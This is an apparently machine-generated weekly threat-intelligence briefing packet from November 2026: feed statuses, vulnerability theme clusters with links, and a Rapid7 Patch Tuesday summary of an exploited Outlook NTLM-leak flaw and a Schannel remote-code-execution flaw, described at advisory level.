# PHANTOMSignal Briefing Packet

- Generated: 2026-11-14T10:00:38.257823+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 76
- Total items in window: 359
- Total clusters raw: 166
- Total clusters in packet: 80
- Dropped low score: 84
- Dropped overflow: 2

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 6
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: fetch_error
  - Item count: 0
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 4
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 6
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 1
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 1
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 2
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 8
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 8
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 6
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 20
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 19
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 50
  - In window count: 1
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 27
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 6
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 27
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 25
  - In window count: 25
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 3

## Affinity groups (themes)

### Microsoft Defender vulnerability activity
- Anchor signal: Microsoft Defender
- Theme key: microsoft-defender
- Cluster count: 5
- Article count: 9
- Cohesion: 0.302
- Shared strong signals: Microsoft Defender
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Microsoft Defender
- Cluster IDs: 26581d7b17, fba6e81cad, 656ea1ba73, 5b374473ad, bfd8c8319c
- Links:
  - https://www.microsoft.com/en-us/security/blog/2026/11/12/trained-to-betray-how-post-training-supply-chain-attacks-hijack-coding-agents/
  - https://www.microsoft.com/en-us/security/blog/2026/11/11/lessons-from-59-linux-kernel-bug-reports/
  - https://thehackernews.com/2026/11/threatsday-59-linux-kernel-bugs-falcon.html
  - https://www.microsoft.com/en-us/security/blog/2026/11/13/sckit-abuses-screenconnect-deploy-remote-access-target-technician-sessions/
  - https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
  - https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer

### CVE-2026-124194 exploitation activity
- Anchor signal: CVE-2026-124194
- Theme key: cve-2026-124194
- Cluster count: 3
- Article count: 3
- Cohesion: 0.245
- Shared strong signals: CVE-2026-124194
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, zero_day
  - cve_ids: CVE-2026-124194
  - urgency_signals: actively_exploited, zero_day
- Cluster IDs: e1f9a19221, 75a070b13c, ed2e51b312
- Links:
  - https://www.rapid7.com/blog/post/em-patch-tuesday-november-2026
  - https://blog.talosintelligence.com/microsoft-patch-tuesday-for-november-2026/
  - https://krebsonsecurity.com/2026/11/microsoft-fixes-nearly-1100-security-vulnerabilities/

### active exploitation targeting Google Cloud
- Anchor signal: Google Cloud
- Theme key: google-cloud
- Cluster count: 3
- Article count: 9
- Cohesion: 0.263
- Shared strong signals: Google Cloud
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: Google Cloud, Anthropic/Claude
  - cve_ids: CVE-2026-119618
- Cluster IDs: 51b673df55, 7ca18b7a94, f326b30326
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-119618/
  - https://webflow.sysdig.com/blog/httpd-cve-2026-119618-detecting-heap-corruption-and-rce-in-apache-http-server-mod-http2
  - https://www.wiz.io/blog/cve-2026-119618-rce-apache-http-server-vulnerability
  - https://thehackernews.com/2026/11/critical-apache-http2-flaw-could-let.html
  - https://cloud.google.com/blog/topics/hpc/whats-new-in-hpc-and-ai-at-sc26/
  - https://thehackernews.com/2026/11/google-cloud-warns-three-amd-turin-cpu.html
  - https://www.bleepingcomputer.com/news/security/apache-http-server-patches-critical-http-2-remote-code-execution-flaw/

### ransomware extortion targeting Android
- Anchor signal: Android
- Theme key: android
- Cluster count: 3
- Article count: 4
- Cohesion: 0.239
- Shared strong signals: Android
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, web_shell_backdoor
  - affected_industries: financial_services
  - affected_products: Android
- Cluster IDs: 877727aec7, 7cc91e5ade, 2cab26404c
- Links:
  - https://research.checkpoint.com/2026/not-all-that-glitters-is-gold-tracking-copperdragons-sparrow-framework-around-the-globe/
  - https://securelist.com/malware-report-q3-2026-mobile-statistics/121844/
  - https://www.darkreading.com/mobile-security/arcticrat-cybercrime-gang-profiles-victim-finances-ai
  - https://research.checkpoint.com/2026/php2shell-exploitation-on-check-point-gateway/

### Palo Alto Networks active exploitation
- Anchor signal: Palo Alto Networks
- Theme key: palo-alto-networks
- Cluster count: 3
- Article count: 4
- Cohesion: 0.2
- Shared strong signals: Palo Alto Networks
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, ransomware_extortion
  - affected_products: Palo Alto Networks
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: a1853faf68, 2cab26404c, e8815d20df
- Links:
  - https://thehackernews.com/2026/11/cisco-broadworks-and-openwave-flaws.html
  - https://research.checkpoint.com/2026/php2shell-exploitation-on-check-point-gateway/
  - https://securelist.com/malware-report-q3-2026-pc-iot-statistics/121843/
  - https://isc.sans.edu/diary/rss/33518

### SonicWall active exploitation
- Anchor signal: SonicWall
- Theme key: sonicwall
- Cluster count: 3
- Article count: 4
- Cohesion: 0.222
- Shared strong signals: SonicWall
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, ransomware_extortion
  - affected_products: SonicWall
  - urgency_signals: actively_exploited
- Cluster IDs: af40f55acb, e8815d20df, be0ba4d322
- Links:
  - https://risky.biz/RBNEWS631/
  - https://securelist.com/malware-report-q3-2026-pc-iot-statistics/121843/
  - https://isc.sans.edu/diary/rss/33518
  - https://research.checkpoint.com/2026/9th-november-threat-intelligence-report/

### VMware exploitation (CVE-2026-123039)
- Anchor signal: VMware
- Theme key: vmware
- Cluster count: 4
- Article count: 4
- Cohesion: 0.245
- Shared strong signals: VMware
- Member CVEs: CVE-2026-123039
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, web_shell_backdoor
  - affected_products: VMware
  - cve_ids: CVE-2026-123039
- Cluster IDs: 269bffa279, 2cab26404c, ab668646b3, 9ce12b8d82
- Links:
  - https://www.recordedfuture.com/blog/ghostframe-esxi-implant-settra-ransomware
  - https://www.bleepingcomputer.com/news/security/check-point-gateways-hacked-via-php2shell-to-deploy-vmware-esxi-wiper/
  - https://research.checkpoint.com/2026/php2shell-exploitation-on-check-point-gateway/
  - https://thehackernews.com/2026/11/hackers-exploit-php2shell-flaws-in.html
  - https://www.bleepingcomputer.com/news/security/check-point-patches-zero-day-that-lets-hackers-get-root-access/

### Ivanti active exploitation
- Anchor signal: Ivanti
- Theme key: ivanti
- Cluster count: 3
- Article count: 3
- Cohesion: 0.214
- Shared strong signals: Ivanti
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, web_shell_backdoor, zero_day, active_exploitation
  - affected_products: Ivanti, Microsoft 365
  - cve_ids: CVE-2026-123039
  - urgency_signals: actively_exploited, zero_day
- Cluster IDs: 2cab26404c, ed2e51b312, 9ce12b8d82
- Links:
  - https://research.checkpoint.com/2026/php2shell-exploitation-on-check-point-gateway/
  - https://krebsonsecurity.com/2026/11/microsoft-fixes-nearly-1100-security-vulnerabilities/
  - https://www.bleepingcomputer.com/news/security/check-point-patches-zero-day-that-lets-hackers-get-root-access/

### CVE-2026-125350 exploitation activity
- Anchor signal: CVE-2026-125350
- Theme key: cve-2026-125350
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: CVE-2026-125350
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation
  - cve_ids: CVE-2026-125350
  - urgency_signals: actively_exploited, zero_day
- Cluster IDs: 9f1c44758d, ed2e51b312
- Links:
  - https://thehackernews.com/2026/11/google-issues-chrome-security-update.html
  - https://krebsonsecurity.com/2026/11/microsoft-fixes-nearly-1100-security-vulnerabilities/

### active exploitation targeting Cisco
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 2
- Article count: 2
- Cohesion: 0.35
- Shared strong signals: Cisco
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: Cisco
- Cluster IDs: 75a070b13c, 912dd8fe31
- Links:
  - https://blog.talosintelligence.com/microsoft-patch-tuesday-for-november-2026/
  - https://blog.talosintelligence.com/artex-and-beyond/

### Linux kernel vulnerability activity
- Anchor signal: Linux kernel
- Theme key: linux-kernel
- Cluster count: 2
- Article count: 3
- Cohesion: 0.2
- Shared strong signals: Linux kernel
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Linux kernel
- Cluster IDs: eb92172155, fba6e81cad
- Links:
  - https://tldrsec.com/p/tldr-sec-354
  - https://www.microsoft.com/en-us/security/blog/2026/11/11/lessons-from-59-linux-kernel-bug-reports/
  - https://thehackernews.com/2026/11/threatsday-59-linux-kernel-bugs-falcon.html

### Citrix vulnerability activity
- Anchor signal: Citrix
- Theme key: citrix
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: Citrix
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Citrix
  - urgency_signals: preauth_unauth
- Cluster IDs: a1853faf68, cb75cedcf6
- Links:
  - https://thehackernews.com/2026/11/cisco-broadworks-and-openwave-flaws.html
  - https://thehackernews.com/2026/11/citrix-patches-12-netscaler-and-secure.html

## Forward signals

### Novelty
- Novel cves: 0
- Novel actors: 0
- Novel products: 0

### Velocity bursts (0)

### Leading edge (0)

### Convergence (15)
- Pair: CVE-2026-119618 + Anthropic/Claude (cluster 51b673df55, first observation: True)
- Pair: CVE-2026-119618 + GitHub (cluster 51b673df55, first observation: True)
- Pair: CVE-2026-119618 + Google Cloud (cluster 51b673df55, first observation: True)
- Pair: CVE-2026-125350 + Anthropic/Claude (cluster 9f1c44758d, first observation: True)
- Pair: CVE-2026-125350 + GitHub (cluster 9f1c44758d, first observation: True)
- Pair: CVE-2026-125350 + OpenAI/ChatGPT (cluster 9f1c44758d, first observation: True)
- Pair: CVE-2026-2441 + GitHub (cluster 9f1c44758d, first observation: True)
- Pair: CVE-2026-3909 + GitHub (cluster 9f1c44758d, first observation: True)
- Pair: CVE-2026-3910 + GitHub (cluster 9f1c44758d, first observation: True)
- Pair: CVE-2026-5281 + GitHub (cluster 9f1c44758d, first observation: True)
- Pair: CVE-2013-2165 + Citrix (cluster a1853faf68, first observation: True)
- Pair: CVE-2013-2165 + F5 BIG-IP (cluster a1853faf68, first observation: True)
- Pair: CVE-2013-2165 + Palo Alto Networks (cluster a1853faf68, first observation: True)
- Pair: CVE-2020-7961 + Citrix (cluster a1853faf68, first observation: True)
- Pair: CVE-2020-7961 + F5 BIG-IP (cluster a1853faf68, first observation: True)

### Drift (2)
- **UNC5221** (cluster 2cab26404c)
  - New industries: financial_services
  - New products: Android
  - Prior top industries: critical_infrastructure, government, manufacturing_industrial
  - Prior top products: Citrix, Ivanti, Palo Alto Networks
- **Cl0p** (cluster d7028f613a)
  - New industries: (none)
  - New products: GitHub
  - Prior top industries: financial_services, government, manufacturing_industrial
  - Prior top products: Anthropic/Claude, OpenAI/ChatGPT, SolarWinds

### Persistence (15)
- actor_attribution: Cl0p (weeks observed: 13, cluster d7028f613a)
- actor_attribution: UNC5221 (weeks observed: 9, cluster 2cab26404c)
- actor_attribution: LockBit (weeks observed: 8, cluster a46657a5b4)
- cve_ids: CVE-2026-15409 (weeks observed: 5, cluster e8815d20df)
- cve_ids: CVE-2026-109618 (weeks observed: 4, cluster 2cab26404c)
- cve_ids: CVE-2026-109619 (weeks observed: 4, cluster 2cab26404c)
- cve_ids: CVE-2026-15410 (weeks observed: 4, cluster e8815d20df)
- cve_ids: CVE-2026-85102 (weeks observed: 4, cluster 9ce12b8d82)
- cve_ids: CVE-2026-2441 (weeks observed: 3, cluster 9f1c44758d)
- cve_ids: CVE-2026-3909 (weeks observed: 3, cluster 9f1c44758d)
- cve_ids: CVE-2026-3910 (weeks observed: 3, cluster 9f1c44758d)
- cve_ids: CVE-2026-5281 (weeks observed: 3, cluster 9f1c44758d)
- cve_ids: CVE-2025-60710 (weeks observed: 3, cluster e8815d20df)
- cve_ids: CVE-2026-0257 (weeks observed: 3, cluster e8815d20df)
- cve_ids: CVE-2026-84869 (weeks observed: 3, cluster b4cc660673)

### Tier inversion (0)

## Clusters

### Cluster e1f9a19221 — score 36

- Title: Patch Tuesday - November 2026
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-11-10T21:55:37+00:00
- Link: https://www.rapid7.com/blog/post/em-patch-tuesday-november-2026
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- cve_ids: CVE-2026-119952, CVE-2026-124194
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- cve_ids: CVE-2026-124194, CVE-2026-119952
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Microsoft is publishing 1,092 own-product vulnerabilities on November 2026 Patch Tuesday, including 745 vulnerabilities in Windows. Until a few months ago, these volumes would have been unimaginable, but if anything, this month feels like a slight reprieve. The jury is still out on whether patching many more vulnerabilities will lead to better security outcomes; every code change to resolve a known vulnerability could easily introduce new hidden treasure for researchers or threat actors to unearth in the future. Despite the vast uptick in volume during 2026, there has been no accompanying increase in the number of vulnerabilities known to be exploited in the wild. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, with no known public disclosure at all this month. Outlook: zero-day spoofing Imagine coming home and checking your mailbox to find a postcard. You admire the non-specific image of a tropical beach at sunset, and flip it over t
```

#### Full body

```
Patch Tuesday Patch Tuesday - November 2026 Adam Barnett Nov 10, 2026 | Last updated on Nov 12, 2026 | 179 min read Patch Tuesday - November 2026 Table of contents Patch Tuesday - November 2026 Table of contents Microsoft is publishing 1,092 own-product vulnerabilities on November 2026 Patch Tuesday, including 745 vulnerabilities in Windows. Until a few months ago, these volumes would have been unimaginable, but if anything, this month feels like a slight reprieve. The jury is still out on whether patching many more vulnerabilities will lead to better security outcomes; every code change to resolve a known vulnerability could easily introduce new hidden treasure for researchers or threat actors to unearth in the future. Despite the vast uptick in volume during 2026, there has been no accompanying increase in the number of vulnerabilities known to be exploited in the wild. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, with no known public disclosure at all this month. Outlook: zero-day spoofing Imagine coming home and checking your mailbox to find a postcard. You admire the non-specific image of a tropical beach at sunset, and flip it over to scan the handwriting on the back, which looks vaguely familiar. It’s addressed to you, but you can’t make out the signature, and the message is short and generic. Is that real handwriting, or has this been printed? Probably marketing material. You put the card in the recycling and, since life is busy, you move on and forget about it. Somehow, you remain entirely unaware that, immediately after reading the postcard, you took out your phone and sent high-resolution images of your front door key to a number you’ve never contacted before. Is this sketch just some rather questionable science fiction? Yes, hopefully, but what if that non-specific postcard was instead a malicious file in your Outlook inbox? Now we’re talking about CVE-2026-124194 , an exploited-in-the-wild spoofing vulnerability. Merely opening a specially crafted malicious file causes Outlook to silently connect to an attacker-controlled location and leak the user’s NTLM v2 hash. All supported versions of classic Outlook receive patches. The relatively low CVSS v3.1 base score of 6.5 does not tell the full story here, since this vulnerability provides value for both commodity attackers working to harvest initial access at scale, and also more targeted campaigns by more sophisticated threat actors. The NTLM v2 hash can be relayed live to impersonate the user against another service, at least where those services do not implement adequate safeguards such as message signing for SMB or LDAP , as well as Extended Protection for Authentication for Exchange or Active Directory Certificate Services . Alternatively, the NTLM v2 hash can be cracked offline by a motivated attacker to retrieve the underlying credential. The Preview Pane is not a vector, which will help limit the real-world impact somewhat. Windows Schannel: critical pre-auth RCE A pre-authentication remote code execution (RCE) vulnerability in Windows will always attract attention. CVE-2026-119952 allows an attacker to execute code on a target system by sending specially crafted malicious packets. Since the vulnerable component is Schannel, which is Microsoft’s implementation of Transport Layer Security (TLS) , attackers may not have to look very far to find vulnerable endpoints. The advisory provides some comfort by pointing out that specific conditions are required for exploitability, which reduces the likelihood of broad exploitation, but the advisory still assesses exploitation as more likely, so Microsoft presumably expects that the development of reliable exploit code is feasible. In many cases, there will be no need for an attacker to have an existing foothold on the same subnet. The execution context likely depends on the vulnerable service, which points to the evergreen need for least privilege architecture, but
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Patch Tuesday - November 2026
  - Published: 2026-11-10T21:55:37+00:00
  - Link: https://www.rapid7.com/blog/post/em-patch-tuesday-november-2026
